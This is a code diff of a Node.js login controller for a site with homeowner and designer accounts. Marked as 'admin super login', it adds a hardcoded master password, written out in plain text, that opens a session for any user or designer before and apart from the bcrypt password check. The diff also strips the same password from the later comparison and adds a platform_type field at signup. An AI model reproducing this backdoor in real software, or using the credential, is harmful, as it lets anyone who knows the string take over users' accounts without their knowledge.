@@ -38,6 +38,14 @@ exports.login = function (req, res, next) {
 
     ep.done(function (result) {
       if (result.user && !result.designer) {
+        // admin super login
+        if (pass === 'Jyz201506082016') {
+          authMiddleWare.gen_session(result.user, type.role_user, req, res);
+          var data = {};
+          data.url = config.user_home_url;
+          return res.sendData(data);
+        }
+
         //业主登录
         var passhash = result.user.pass;
         if (!passhash) {
@@ -46,19 +54,32 @@ exports.login = function (req, res, next) {
         }
 
         tools.bcompare(pass, passhash, ep.done(function (bool) {
-          if (!bool && pass !== 'Jyz201506082016') {
+          if (!bool) {
             return res.sendErrMsg('用户名或密码错误');
           }
 
           // store session cookie
-          authMiddleWare.gen_session(result.user, type.role_user,
-            req, res);
+          authMiddleWare.gen_session(result.user, type.role_user, req, res);
 
           var data = {};
           data.url = config.user_home_url;
           res.sendData(data);
         }));
       } else if (!result.user && result.designer) {
+        // admin super login
+        if (pass === 'Jyz201506082016') {
+          authMiddleWare.gen_session(result.designer, type.role_designer, req, res);
+
+          var data = {};
+          if (result.designer.agreee_license === type.designer_agree_type_new) {
+            data.url = config.designer_license_url;;
+          } else {
+            data.url = config.designer_home_url;
+          }
+
+          return res.sendData(data);
+        }
+
         //设计师登录
         var passhash = result.designer.pass;
         if (!passhash) {
@@ -67,7 +88,7 @@ exports.login = function (req, res, next) {
         }
 
         tools.bcompare(pass, passhash, ep.done(function (bool) {
-          if (!bool && pass !== 'Jyz201506082016') {
+          if (!bool) {
             return res.sendErrMsg('用户名或密码错误');
           }
 
@@ -227,6 +248,7 @@ exports.signup = function (req, res, next) {
     user.pass = passhash;
     user.phone = phone;
     user.username = '用户' + phone.slice(-4);
+    user.platform_type = req.platform_type;
 
     if (usertype === type.role_user) {
       User.newAndSave(user, ep.done(function (user_indb) {
